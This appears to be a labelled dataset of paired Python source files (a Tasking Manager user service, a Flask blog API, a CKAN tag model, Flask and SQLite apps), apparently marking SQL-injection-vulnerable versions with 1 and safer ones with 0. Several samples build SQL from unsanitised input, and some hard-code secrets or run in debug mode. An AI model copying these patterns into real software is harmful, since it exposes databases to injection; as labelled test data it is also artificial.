        # for rowproxy in total_area_result:
            # rowproxy.items() returns an array like [(key0, value0), (key1, value1)]
            # for tup in rowproxy.items():
                # total_area += tup[1]
                # current_app.logger.debug(total_area)
        # dto.total_area = total_area

        tasks_mapped_sql = ""select coalesce(sum(ST_Area(geometry)), 0) as sum from public.tasks where task_status = :task_status""
        tasks_mapped_result = db.engine.execute(text(tasks_mapped_sql), task_status=TaskStatus.MAPPED.value)

        dto.total_mapped_area = tasks_mapped_result.fetchone()['sum']

        tasks_validated_sql = ""select coalesce(sum(ST_Area(geometry)), 0) as sum from public.tasks where task_status = :task_status""
        tasks_validated_result = db.engine.execute(text(tasks_validated_sql), task_status=TaskStatus.VALIDATED.value)

        dto.total_validated_area = tasks_validated_result.fetchone()['sum']

        campaign_count = db.session.query(Project.campaign_tag, func.count(Project.campaign_tag))\
            .group_by(Project.campaign_tag).all()
        no_campaign_count = 0
        unique_campaigns = 0

        for tup in campaign_count:
            campaign_stats = CampaignStatsDTO(tup)
            if campaign_stats.tag:
                dto.campaigns.append(campaign_stats)
                unique_campaigns += 1
            else:
                no_campaign_count += campaign_stats.projects_created

        if no_campaign_count:
            no_campaign_proj = CampaignStatsDTO(('Untagged', no_campaign_count))
            dto.campaigns.append(no_campaign_proj)
        dto.total_campaigns = unique_campaigns

        org_proj_count = db.session.query(Project.organisation_tag, func.count(Project.organisation_tag))\
            .group_by(Project.organisation_tag).all()
        no_org_count = 0
        unique_orgs = 0

        for tup in org_proj_count:
            org_stats = OrganizationStatsDTO(tup)
            if org_stats.tag:
                dto.organizations.append(org_stats)
                unique_orgs += 1
            else:
                no_org_count += org_stats.projects_created

        if no_org_count:
            no_org_proj = OrganizationStatsDTO(('Untagged', no_org_count))
            dto.organizations.append(no_org_proj)
        dto.total_organizations = unique_orgs

        return dto
/n/n/n/server/services/users/user_service.py/n/nfrom cachetools import TTLCache, cached
from flask import current_app
from functools import reduce
import dateutil.parser
import datetime

from server import db
from server.models.dtos.user_dto import UserDTO, UserOSMDTO, UserFilterDTO, UserSearchQuery, UserSearchDTO, \
    UserStatsDTO
from server.models.dtos.message_dto import MessageDTO
from server.models.postgis.message import Message
from server.models.postgis.task import TaskHistory
from server.models.postgis.user import User, UserRole, MappingLevel
from server.models.postgis.utils import NotFound
from server.services.users.osm_service import OSMService, OSMServiceError
from server.services.messaging.smtp_service import SMTPService
from server.services.messaging.template_service import get_template

user_filter_cache = TTLCache(maxsize=1024, ttl=600)
user_all_cache = TTLCache(maxsize=1024, ttl=600)


class UserServiceError(Exception):
    """""" Custom Exception to notify callers an error occurred when in the User Service """"""

    def __init__(self, message):
        if current_app:
            current_app.logger.error(message)


class UserService:
    @staticmethod
    def get_user_by_id(user_id: int) -> User:
        user = User().get_by_id(user_id)

        if user is None:
            raise NotFound()

        return user

    @staticmethod
    def get_user_by_username(username: str) -> User:
        user = User().get_by_username(username)

        if user is None:
            raise NotFound()

        return user

    @staticmethod
    def update_username(user_id: int, osm_username: str) -> User:
        user = UserService.get_user_by_id(user_id)
        if user.username != osm_username:
            user.update_username(osm_username)

        return user

    @staticmethod
    def register_user(osm_id, username, changeset_count):
        """"""
        Creates user in DB
        :param osm_id: Unique OSM user id
        :param username: OSM Username
        :param changeset_count: OSM changeset count
        """"""
        new_user = User()
        new_user.id = osm_id
        new_user.username = username

        intermediate_level = current_app.config['MAPPER_LEVEL_INTERMEDIATE']
        advanced_level = current_app.config['MAPPER_LEVEL_ADVANCED']

        if changeset_count > advanced_level:
            new_user.mapping_level = MappingLevel.ADVANCED.value
        elif intermediate_level < changeset_count < advanced_level:
            new_user.mapping_level = MappingLevel.INTERMEDIATE.value
        else:
            new_user.mapping_level = MappingLevel.BEGINNER.value

        new_user.create()
        return new_user

    @staticmethod
    def get_user_dto_by_username(requested_username: str, logged_in_user_id: int) -> UserDTO:
        """"""Gets user DTO for supplied username """"""
        requested_user = UserService.get_user_by_username(requested_username)
        logged_in_user = UserService.get_user_by_id(logged_in_user_id)
        UserService.check_and_update_mapper_level(requested_user.id)

        return requested_user.as_dto(logged_in_user.username)

    @staticmethod
    def get_user_dto_by_id(requested_user: int) -> UserDTO:
        """"""Gets user DTO for supplied user id """"""
        requested_user = UserService.get_user_by_id(requested_user)

        return requested_user.as_dto(requested_user.username)

    @staticmethod
    def get_detailed_stats(username: str):
        user = UserService.get_user_by_username(username)
        stats_dto = UserStatsDTO()

        actions = TaskHistory.query.filter(
            TaskHistory.user_id == user.id,
            TaskHistory.action_text != ''
        ).all()

        tasks_mapped = TaskHistory.query.filter(
            TaskHistory.user_id == user.id,
            TaskHistory.action_text == 'MAPPED'
        ).count()
        tasks_validated = TaskHistory.query.filter(
            TaskHistory.user_id == user.id,
            TaskHistory.action_text == 'VALIDATED'
        ).count()
        projects_mapped = TaskHistory.query.filter(
            TaskHistory.user_id == user.id,
            TaskHistory.action == 'STATE_CHANGE'
        ).distinct(TaskHistory.project_id).count()

        stats_dto.tasks_mapped = tasks_mapped
        stats_dto.tasks_validated = tasks_validated
        stats_dto.projects_mapped = projects_mapped
        stats_dto.total_time_spent = 0
        stats_dto.time_spent_mapping = 0
        stats_dto.time_spent_validating = 0

        sql = """"""SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history
                WHERE action='LOCKED_FOR_VALIDATION'
                and user_id = {0};"""""".format(user.id)
        total_validation_time = db.engine.execute(sql)
        for time in total_validation_time:
            total_validation_time = time[0]
            if total_validation_time:
                stats_dto.time_spent_validating = total_validation_time.total_seconds()
                stats_dto.total_time_spent += stats_dto.time_spent_validating

        sql = """"""SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history
                WHERE action='LOCKED_FOR_MAPPING'
                and user_id = {0};"""""".format(user.id)
        total_mapping_time = db.engine.execute(sql)
        for time in total_mapping_time:
            total_mapping_time = time[0]
            if total_mapping_time:
                stats_dto.time_spent_mapping = total_mapping_time.total_seconds()
                stats_dto.total_time_spent += stats_dto.time_spent_mapping

        return stats_dto


    @staticmethod
    def update_user_details(user_id: int, user_dto: UserDTO) -> dict:
        """""" Update user with info supplied by user, if they add or change their email address a verification mail
            will be sent """"""
        user = UserService.get_user_by_id(user_id)

        verification_email_sent = False
        if user_dto.email_address and user.email_address != user_dto.email_address.lower():
            # Send user verification email if they are adding or changing their email address
            SMTPService.send_verification_email(user_dto.email_address.lower(), user.username)
            user.set_email_verified_status(is_verified=False)
            verification_email_sent = True

        user.update(user_dto)
        return dict(verificationEmailSent=verification_email_sent)

    @staticmethod
    @cached(user_all_cache)
    def get_all_users(query: UserSearchQuery) -> UserSearchDTO:
        """""" Gets paginated list of users """"""
        return User.get_all_users(query)

    @staticmethod
    @cached(user_filter_cache)
    def filter_users(username: str, project_id: int, page: int) -> UserFilterDTO:
        """""" Gets paginated list of users, filtered by username, for autocomplete """"""
        return User.filter_users(username, project_id, page)

    @staticmethod
    def is_user_a_project_manager(user_id: int) -> bool:
        """""" Is the user a project manager """"""
        user = UserService.get_user_by_id(user_id)
        if UserRole(user.role) in [UserRole.ADMIN, UserRole.PROJECT_MANAGER]:
            return True

        return False

    @staticmethod
    def get_mapping_level(user_id: int):
        """""" Gets mapping level user is at""""""
        user = UserService.get_user_by_id(user_id)

        return MappingLevel(user.mapping_level)

    @staticmethod
    def is_user_validator(user_id: int) -> bool:
        """""" Determines if user is a validator """"""
        user = UserService.get_user_by_id(user_id)

        if UserRole(user.role) in [UserRole.VALIDATOR, UserRole.ADMIN, UserRole.PROJECT_MANAGER]:
            return True

        return False

    @staticmethod
    def is_user_blocked(user_id: int) -> bool:
        """""" Determines if a user is blocked """"""
        user = UserService.get_user_by_id(user_id)

        if UserRole(user.role) == UserRole.READ_ONLY:
            return True

        return False

    @staticmethod
    def upsert_mapped_projects(user_id: int, project_id: int):
        """""" Add project to mapped projects if it doesn't exist, otherwise return """"""
        User.upsert_mapped_projects(user_id, project_id)

    @staticmethod
    def get_mapped_projects(user_name: str, preferred_locale: str):
        """""" Gets all projects a user has mapped or validated on """"""
        user = UserService.get_user_by_username(user_name)
        return User.get_mapped_projects(user.id, preferred_locale)

    @staticmethod
    def add_role_to_user(admin_user_id: int, username: str, role: str):
        """"""
        Add role to user
        :param admin_user_id: ID of admin attempting to add the role
        :param username: Username of user the role should be added to
        :param role: The requested role
        :raises UserServiceError
        """"""
        try:
            requested_role = UserRole[role.upper()]
        except KeyError:
            raise UserServiceError(f'Unknown role {role} accepted values are ADMIN, PROJECT_MANAGER, VALIDATOR')

        admin = UserService.get_user_by_id(admin_user_id)
        admin_role = UserRole(admin.role)

        if admin_role == UserRole.PROJECT_MANAGER and requested_role == UserRole.ADMIN:
            raise UserServiceError(f'You must be an Admin to assign Admin role')

        if admin_role == UserRole.PROJECT_MANAGER and requested_role == UserRole.PROJECT_MANAGER:
            raise UserServiceError(f'You must be an Admin to assign Project Manager role')

        user = UserService.get_user_by_username(username)
        user.set_user_role(requested_role)

    @staticmethod
    def set_user_mapping_level(username: str, level: str) -> User:
        """"""
        Sets the users mapping level
        :raises: UserServiceError
        """"""
        try:
            requested_level = MappingLevel[level.upper()]
        except KeyError:
            raise UserServiceError(f'Unknown role {level} accepted values are BEGINNER, INTERMEDIATE, ADVANCED')

        user = UserService.get_user_by_username(username)
        user.set_mapping_level(requested_level)

        return user

    @staticmethod
    def set_user_is_expert(user_id: int, is_expert: bool) -> User:
        """"""
        Enabled or disables expert mode for the user
        :raises: UserServiceError
        """"""
        user = UserService.get_user_by_id(user_id)
        user.set_is_expert(is_expert)

        return user

    @staticmethod
    def accept_license_terms(user_id: int, license_id: int):
        """""" Saves the fact user has accepted license terms """"""
        user = UserService.get_user_by_id(user_id)
        user.accept_license_terms(license_id)

    @staticmethod
    def has_user_accepted_license(user_id: int, license_id: int):
        """""" Checks if user has accepted specified license """"""
        user = UserService.get_user_by_id(user_id)
        return user.has_user_accepted_licence(license_id)

    @staticmethod
    def get_osm_details_for_user(username: str) -> UserOSMDTO:
        """"""
        Gets OSM details for the user from OSM API
        :param username: username in scope
        :raises UserServiceError, NotFound
        """"""
        user = UserService.get_user_by_username(username)
        osm_dto = OSMService.get_osm_details_for_user(user.id)
        return osm_dto

    @staticmethod
    def check_and_update_mapper_level(user_id: int):
        """""" Check users mapping level and update if they have crossed threshold """"""
        user = UserService.get_user_by_id(user_id)
        user_level = MappingLevel(user.mapping_level)

        if user_level == MappingLevel.ADVANCED:
            return  # User has achieved highest level, so no need to do further checking

        intermediate_level = current_app.config['MAPPER_LEVEL_INTERMEDIATE']
        advanced_level = current_app.config['MAPPER_LEVEL_ADVANCED']

        try:
            osm_details = OSMService.get_osm_details_for_user(user_id)
            if (osm_details.changeset_count > advanced_level and
                user.mapping_level !=  MappingLevel.ADVANCED.value):
                user.mapping_level = MappingLevel.ADVANCED.value
                UserService.notify_level_upgrade(user_id, user.username, 'ADVANCED')
            elif (intermediate_level < osm_details.changeset_count < advanced_level and
                user.mapping_level != MappingLevel.INTERMEDIATE.value):
                user.mapping_level = MappingLevel.INTERMEDIATE.value
                UserService.notify_level_upgrade(user_id, user.username, 'INTERMEDIATE')
        except OSMServiceError:
            # Swallow exception as we don't want to blow up the server for this
            current_app.logger.error('Error attempting to update mapper level')
            return


        user.save()
        return user

    def notify_level_upgrade(user_id: int, username: str, level: str):
        text_template = get_template('level_upgrade_message_en.txt')

        if username is not None:
            text_template = text_template.replace('[USERNAME]', username)

        text_template = text_template.replace('[LEVEL]', level)
        level_upgrade_message = Message()
        level_upgrade_message.to_user_id = user_id
        level_upgrade_message.subject = 'Mapper Level Upgrade '
        level_upgrade_message.message = text_template
        level_upgrade_message.save()


    @staticmethod
    def refresh_mapper_level() -> int:
        """""" Helper function to run thru all users in the DB and update their mapper level """"""
        users = User.get_all_users_not_pagainated()
        users_updated = 1
        total_users = len(users)

        for user in users:
            UserService.check_and_update_mapper_level(user.id)

            if users_updated % 50 == 0:
                print(f'{users_updated} users updated of {total_users}')

            users_updated += 1

        return users_updated
/n/n/n",1
52,52,35f3d2a1ffde10d3a9055572478e46b9e8d132e9,"rest.py/n/nfrom flask import Flask
from flask_restful import Api, Resource, reqparse
from WebHandler import getHTML
import re

app = Flask(__name__)
api = Api(app)

# Blog REST API
class Blog(Resource):

    #GET Request- Returns website in full html
    def get(self, name):
        # Hoping this stops SQL injection
        if re.match(""^[A-Za-z0-9_-]*$"", name):
            return getHTML(name)
        else:
            return ""RAWR XD""
        
    #def post(self, name):
    #def put(self, name):
    #def delete(self, name):

# Access the api from 198.58.107.98:6969/blog/url-name
api.add_resource(Blog, ""/blog/<string:name>"")

app.run(host='198.58.107.98', port=6969, debug=True)/n/n/n",0
53,53,35f3d2a1ffde10d3a9055572478e46b9e8d132e9,"/rest.py/n/nfrom flask import Flask
from flask_restful import Api, Resource, reqparse
from WebHandler import getHTML

app = Flask(__name__)
api = Api(app)

# Blog REST API
class Blog(Resource):

    #GET Request- Returns website in full html
    def get(self, name):
        return getHTML(name)
        
    #def post(self, name):
    #def put(self, name):
    #def delete(self, name):

# Access the api from 198.58.107.98:6969/blog/url-name
api.add_resource(Blog, ""/blog/<string:name>"")

app.run(host='198.58.107.98', port=6969, debug=True)/n/n/n",1
8,8,f020853c54a1851f196d7fd8897c4620bccf9f6c,"ckan/models/package.py/n/nimport sqlobject

try:
    # vdm >= 0.2
    import vdm.sqlobject.base as vdmbase
    from vdm.sqlobject.base import State
except:
    # vdm == 0.1
    import vdm.base as vdmbase
    from vdm.base import State

# American spelling ...
class License(sqlobject.SQLObject):

    class sqlmeta:
        _defaultOrder = 'name'

    name = sqlobject.UnicodeCol(alternateID=True)
    packages = sqlobject.MultipleJoin('Package')


class PackageRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Package', cascade=True)
    title = sqlobject.UnicodeCol(default=None)
    url = sqlobject.UnicodeCol(default=None)
    download_url = sqlobject.UnicodeCol(default=None)
    license = sqlobject.ForeignKey('License', default=None)
    notes = sqlobject.UnicodeCol(default=None)


class TagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Tag', cascade=True)


class PackageTagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('PackageTag', cascade=True)


class Package(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    
    name = sqlobject.UnicodeCol(alternateID=True)

    # should be attribute_name, module_name, module_object
    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]

    def add_tag_by_name(self, tagname):
        try:
            tag = self.revision.model.tags.get(tagname)
        except: # TODO: make this specific
            tag = self.transaction.model.tags.create(name=tagname)
        self.tags.create(tag=tag)


class Tag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = TagRevision

    name = sqlobject.UnicodeCol(alternateID=True)
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)

    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]

    @classmethod
    def search_by_name(self, text_query):
        text_query = str(text_query) # SQLObject chokes on unicode.
        return self.select(self.q.name.contains(text_query.lower()))


class PackageTag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageTagRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    m2m = []

    package = sqlobject.ForeignKey('Package', cascade=True)
    tag = sqlobject.ForeignKey('Tag', cascade=True)

    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',
            unique=True)

/n/n/n",0
9,9,f020853c54a1851f196d7fd8897c4620bccf9f6c,"/ckan/models/package.py/n/nimport sqlobject

try:
    # vdm >= 0.2
    import vdm.sqlobject.base as vdmbase
    from vdm.sqlobject.base import State
except:
    # vdm == 0.1
    import vdm.base as vdmbase
    from vdm.base import State

# American spelling ...
class License(sqlobject.SQLObject):

    class sqlmeta:
        _defaultOrder = 'name'

    name = sqlobject.UnicodeCol(alternateID=True)
    packages = sqlobject.MultipleJoin('Package')


class PackageRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Package', cascade=True)
    title = sqlobject.UnicodeCol(default=None)
    url = sqlobject.UnicodeCol(default=None)
    download_url = sqlobject.UnicodeCol(default=None)
    license = sqlobject.ForeignKey('License', default=None)
    notes = sqlobject.UnicodeCol(default=None)


class TagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Tag', cascade=True)


class PackageTagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('PackageTag', cascade=True)


class Package(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    
    name = sqlobject.UnicodeCol(alternateID=True)

    # should be attribute_name, module_name, module_object
    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]

    def add_tag_by_name(self, tagname):
        try:
            tag = self.revision.model.tags.get(tagname)
        except: # TODO: make this specific
            tag = self.transaction.model.tags.create(name=tagname)
        self.tags.create(tag=tag)


class Tag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = TagRevision

    name = sqlobject.UnicodeCol(alternateID=True)
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)

    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]

    @classmethod
    def search_by_name(self, text_query):
        text_query_str = str(text_query) # SQLObject chokes on unicode.
        # Todo: Change to use SQLObject statement objects.
        sql_query = ""UPPER(tag.name) LIKE UPPER('%%%s%%')"" % text_query_str
        return self.select(sql_query)


class PackageTag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageTagRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    m2m = []

    package = sqlobject.ForeignKey('Package', cascade=True)
    tag = sqlobject.ForeignKey('Tag', cascade=True)

    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',
            unique=True)

/n/n/n",1
182,182,ae8497f08cf390130db238bda6af40cf96f7b00a,"run.py/n/nimport os

import configparser
from flask_bcrypt import Bcrypt
from flask import Flask, render_template, request, flash, session, redirect, url_for
from forms import Last_FM_Form
import mysql.connector

# Read configuration from file.
config = configparser.ConfigParser()
config.read('config.ini')

# Set up application server.
app = Flask(__name__)
bcrypt = Bcrypt(app)
app.secret_key = ""adbi327fds""

# Create a function for fetching data from the database.
def sql_query(sql):
    db = mysql.connector.connect(**config['mysql.connector'])
    cursor = db.cursor()
    cursor.execute(sql)
    result = cursor.fetchall()
    cursor.close()
    db.close()
    return result


def sql_execute(sql):
    db = mysql.connector.connect(**config['mysql.connector'])
    cursor = db.cursor()
    cursor.execute(sql)
    db.commit()
    cursor.close()
    db.close()

# For this example you can select a handler function by
# uncommenting one of the @app.route decorators.

#@app.route('/')
def basic_response():
    return ""It works!"" #example

# This route involves some LOGIN stuff, not implemented yet	
#@app.route('/login', methods = ['GET', 'POST'])
ddef login():
    if 'user' in session:
        return redirect(url_for('dashboard'))

    message = None

    if request.method == ""POST"":
        usern = request.form.get(""username"")
        passw = request.form.get(""password"").encode('utf-8')
        result = db.execute(""SELECT * FROM user WHERE username = :u"", {""u"": usern}).fetchone()

        if result is not None:
            print(result['password'])
            if bcrypt.check_password_hash(result['password'], passw) is True:
                session['user'] = usern
                return redirect(url_for('dashboard'))

        message = ""Username or password is incorrect.""
    return render_template(""login.html"", message=message)
   

# route for account registartion
@app.route(""/register"", methods=[""GET"", ""POST""])
def register():
    if 'user' in session:
        return redirect(url_for('dashboard'))

    message = None

    if request.method == ""POST"":
        try: 
            usern = request.form.get(""username"")
            passw = request.form.get(""password"")
            passw_hash = bcrypt.generate_password_hash(passw).decode('utf-8')

            result = db.execute(""INSERT INTO user (username, password) VALUES (:u, :p)"", {""u"": usern, ""p"": passw_hash})
            db.commit()

            if result.rowcount > 0:
                session['user'] = usern
                return redirect(url_for('dashboard'))

        except exc.IntegrityError:
            message = ""Username already exists.""
            db.execute(""ROLLBACK"")
            db.commit()

    return render_template(""registration.html"", message=message)

#route for logout
@app.route(""/logout"")
def logout():
    session.pop('user', None)
    return redirect(url_for('login'))
   
# Home page after login
@app.route('/home/', methods=['GET', 'POST'])	
@app.route('/home/<username>', methods=['GET', 'POST'])
def home(username = None):
	lastFM = Last_FM_Form(request.form)
	if request.method == 'POST':
		return lastFM_results(lastFM, username = username)
	return render_template('home.html', username = username, form = lastFM)

# Gets search results	
@app.route('/results')
def lastFM_results(lastFM, username):
	results = []
	search_string = lastFM.data['search']
	if lastFM.data['search'] == '':
		#result = 
		#results = result.all()
		result = []
	
	if not results:
		flash('No results could be found for your search, please try again.')
		return redirect('/home/%s' % username)
	else:
		return render_template(lastFM_results.html, results = results)

# Given code from teacher's example, not used yet
#@app.route('/', methods=['GET', 'POST'])
def template_response_with_data():
    print(request.form)
    if ""buy-book"" in request.form:
        book_id = int(request.form[""buy-book""])
        sql = ""delete from book where id={book_id}"".format(book_id=book_id)
        sql_execute(sql)
    template_data = {}
    sql = ""select id, title from book order by title""
    books = sql_query(sql)
    template_data['books'] = books
    return render_template('home-w-data.html', template_data=template_data)

if __name__ == '__main__':
    app.run(**config['app'])
/n/n/n",0
183,183,ae8497f08cf390130db238bda6af40cf96f7b00a,"/run.py/n/nimport os

import configparser
from flask_bcrypt import Bcrypt
from flask import Flask, render_template, request, flash, session, redirect, url_for
from forms import Last_FM_Form
import mysql.connector

# Read configuration from file.
config = configparser.ConfigParser()
config.read('config.ini')

# Set up application server.
app = Flask(__name__)
bcrypt = Bcrypt(app)
app.secret_key = ""adbi327fds""

# Create a function for fetching data from the database.
def sql_query(sql):
    db = mysql.connector.connect(**config['mysql.connector'])
    cursor = db.cursor()
    cursor.execute(sql)
    result = cursor.fetchall()
    cursor.close()
    db.close()
    return result


def sql_execute(sql):
    db = mysql.connector.connect(**config['mysql.connector'])
    cursor = db.cursor()
    cursor.execute(sql)
    db.commit()
    cursor.close()
    db.close()

# For this example you can select a handler function by
# uncommenting one of the @app.route decorators.

#@app.route('/')
def basic_response():
    return ""It works!"" #example

# This route involves some LOGIN stuff, not implemented yet	
#@app.route('/login', methods = ['GET', 'POST'])
def login():
   if request.method == 'POST':
      session['username'] = request.form['username']
      return redirect(url_for('index'))
   #return render_template('login.html', )

# route for account registartion
@app.route(""/register"", methods=[""GET"", ""POST""])
def register():
    if 'user' in session:
        return redirect(url_for('dashboard'))

    message = None

    if request.method == ""POST"":
        try: 
            usern = request.form.get(""username"")
            passw = request.form.get(""password"")
            passw_hash = bcrypt.generate_password_hash(passw).decode('utf-8')

            result = db.execute(""INSERT INTO accounts (username, password) VALUES (:u, :p)"", {""u"": usern, ""p"": passw_hash})
            db.commit()

            if result.rowcount > 0:
                session['user'] = usern
                return redirect(url_for('dashboard'))

        except exc.IntegrityError:
            message = ""Username already exists.""
            db.execute(""ROLLBACK"")
            db.commit()

    return render_template(""registration.html"", message=message)

#route for logout
@app.route(""/logout"")
def logout():
    session.pop('user', None)
    return redirect(url_for('login'))
   
# Home page after login
@app.route('/home/', methods=['GET', 'POST'])	
@app.route('/home/<username>', methods=['GET', 'POST'])
def home(username = None):
	lastFM = Last_FM_Form(request.form)
	if request.method == 'POST':
		return lastFM_results(lastFM, username = username)
	return render_template('home.html', username = username, form = lastFM)

# Gets search results	
@app.route('/results')
def lastFM_results(lastFM, username):
	results = []
	search_string = lastFM.data['search']
	if lastFM.data['search'] == '':
		#result = 
		#results = result.all()
		result = []
	
	if not results:
		flash('No results could be found for your search, please try again.')
		return redirect('/home/%s' % username)
	else:
		return render_template(lastFM_results.html, results = results)

# Given code from teacher's example, not used yet
#@app.route('/', methods=['GET', 'POST'])
def template_response_with_data():
    print(request.form)
    if ""buy-book"" in request.form:
        book_id = int(request.form[""buy-book""])
        sql = ""delete from book where id={book_id}"".format(book_id=book_id)
        sql_execute(sql)
    template_data = {}
    sql = ""select id, title from book order by title""
    books = sql_query(sql)
    template_data['books'] = books
    return render_template('home-w-data.html', template_data=template_data)

if __name__ == '__main__':
    app.run(**config['app'])
/n/n/n",1
176,176,186c5ff5cdf58272e253a1bb432419ee50d93109,"database.py/n/nimport sqlite3
import os.path
from cpwrap import CFG
import random
import string

def connectDB():
    conn = sqlite3.connect(CFG(""dbname""))
    return (conn, conn.cursor())

def closeDB(conn, cursor=None):
    conn.commit()
    conn.close()

def queryAll(cursor, reqString, *args):
    try:
        if len(args) > 0:
            cursor.execute(reqString, *args)
        else:
            cursor.execute(reqString)
        ret = cursor.fetchall()
        if ret:
            return ret
    except IndexError:
        return []

def queryOne(cursor, reqString, *args):
    try:
        if len(args) > 0:
            cursor.execute(reqString, *args)
        else:
            cursor.execute(reqString)
        ret = cursor.fetchone()
        if ret:
            return ret[0]
    except IndexError:
        return None

def queryQuestion(poll_name):
    conn, c = connectDB()
    req = ""SELECT question from {} WHERE name = ?"".format(CFG(""poll_table_name""))
    tmp = queryOne(c, req, (poll_name,))
    conn.close()
    return tmp

def tokenNeededExternal(poll_name):
    conn, c = connectDB()
    tmp = checkTokenNeeded(c, poll_name)
    conn.close()
    return tmp

def markTokenUsedExternal(token, optStr=""""):
    conn, c = connectDB()
    req = ""UPDATE {} SET \""options_selected\""=? WHERE token=?"".format(CFG(""tokens_table_name""))
    c.execute(req, (optStr, token,))
    closeDB(conn)

def init():
    if os.path.isfile(CFG(""dbname"")):
        return
    conn, c = connectDB()
    c.execute(""CREATE TABLE "" + CFG(""poll_table_name"") + ""(\
                    name text,\
                    options text,\
                    has_tokens integer,\
                    show_results integer,\
                    question text,\
                    multi integer, \
                    date text)""\
                    )
    c.execute(""CREATE TABLE {}(name_option text, count integer)"".format(CFG(""options_table_name"")))
    c.execute(""CREATE TABLE {}(token text, name text, options_selected text)"".format(CFG(""tokens_table_name"")))
    c.execute(""CREATE TABLE {}(adm_token text, poll_name text)"".format(CFG(""admintoken_table_name"")))
    closeDB(conn)

def checkTokenValid(cursor, token, poll_name):
    req = ""SELECT name, options_selected from {} where token=?"".format(CFG(""tokens_table_name""))
    answer = queryAll(cursor, req, (token,))
    return answer and answer[0][0] == poll_name and answer[0][1] == 'NONE'

def checkAdmTokenValid(poll_name, adm_token):
    conn, c = connectDB()
    req = ""SELECT poll_name from {} where adm_token=?"".format(CFG(""admintoken_table_name""))
    answer = queryOne(c, req, (adm_token,))
    closeDB(conn)
    return answer == poll_name

def isValidAdmToken(adm_token):
    conn, c = connectDB()
    req = ""SELECT *  from {} where adm_token=?"".format(CFG(""admintoken_table_name""))
    answer = bool(queryOne(c, req, (adm_token,)))
    closeDB(conn)
    return answer

def isValidToken(token):
    conn, c = connectDB()
    req = ""SELECT * from {} where token=?"".format(CFG(""tokens_table_name""))
    answer = bool(queryOne(c, req, (token,)))
    closeDB(conn)
    return answer

def pollNameFromToken(token):
    conn, c = connectDB()
    req = ""SELECT name from {} where token=?"".format(CFG(""tokens_table_name""))
    answer = queryOne(c, req, (token,))
    if not answer:
        req = ""SELECT poll_name from {} where adm_token=?"".format(CFG(""admintoken_table_name""))
        answer = queryOne(c, req, (token,))
    closeDB(conn)
    return answer


def checkTokenNeeded(cursor, poll_name):
    req = ""SELECT has_tokens FROM {} WHERE name=?"".format(CFG(""poll_table_name""))
    return queryOne(cursor, req, (poll_name,)) == 1

def incrementOption(cursor, poll_name, option):
    key = poll_name+""-""+option
    req = ""UPDATE {} SET count=count+1 WHERE name_option=?"".format(CFG(""options_table_name""))
    cursor.execute(req, (key,))

def isMultiChoice(poll_name):
    conn, c = connectDB()
    req = ""SELECT multi FROM {} WHERE name=?"".format(CFG(""poll_table_name""))
    ret = queryOne(c, req, (poll_name,)) == 1
    closeDB(conn)
    return ret

def vote(poll_name, options_string, token_used=""DUMMY_INVALID_TOKEN""):
    conn, c = connectDB()

    # check token
    token_valid = checkTokenValid(c, token_used, poll_name)
    if not token_valid and checkTokenNeeded(c, poll_name):
        raise PermissionError(""Poll requires valid token."")
    markTokenUsedExternal(token_used, options_string)

    # save changes
    # lambda x: x -> röfl :D
    options = list(filter(lambda x: x, options_string.split("","")))
    # check if multi-choice
    if len(options) > 1:
        if not isMultiChoice(poll_name):
            raise ValueError(""multiple options for single choice"")

    for opt in options:
        incrementOption(c, poll_name, opt)

    closeDB(conn)

def getOptionCount(c, poll_name, option):
    key = poll_name + ""-"" + option
    req = ""SELECT count FROM {table} WHERE name_option=?"".format(table=CFG(""options_table_name""))
    count = queryOne(c, req, (key,))
    if count == None:
        raise AssertionError(""Unknown answer for poll. WTF?"")
    return count;

def getResults(poll_name):
    conn, c = connectDB()
    req = ""SELECT options from {} where name=?"".format(CFG(""poll_table_name""))
    options_str = queryOne(c, req, (poll_name,))

    if not options_str:
        raise LookupError(""Poll '{}' not found in DB"".format(poll_name))

    total = 0
    options = options_str.split("","")
    results = dict()
    for opt in options:
        count = getOptionCount(c, poll_name, opt)
        total += int(count)
        results.update({opt:count})

    conn.close()
    return (results, total)

def insertOption(c, poll_name, option):
    key = poll_name + ""-"" + option
    count = 0
    params = (key, count)
    req = ""INSERT INTO {} VALUES (?, ?)"".format(CFG(""options_table_name""))
    c.execute(req, params)

def getTokensExternal(poll_name):
    req = ""SELECT token FROM {} WHERE name=?"".format(CFG(""tokens_table_name""))
    conn, c = connectDB()
    tmp = queryAll(c, req, (poll_name,))
    conn.close()
    return tmp

def genSingleToken(length=5):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))

def genTokens(c, poll_name, count=False):
    if not count:
        count = CFG(""default_token_count"")

    tokens = [ genSingleToken() for x in range(0,count) ]
    for token in tokens:
        name = poll_name 
        options_selected = ""NONE""
        params = (token, name, options_selected)
        req = ""INSERT INTO {} VALUES (?, ?, ?)"".format(CFG(""tokens_table_name""))
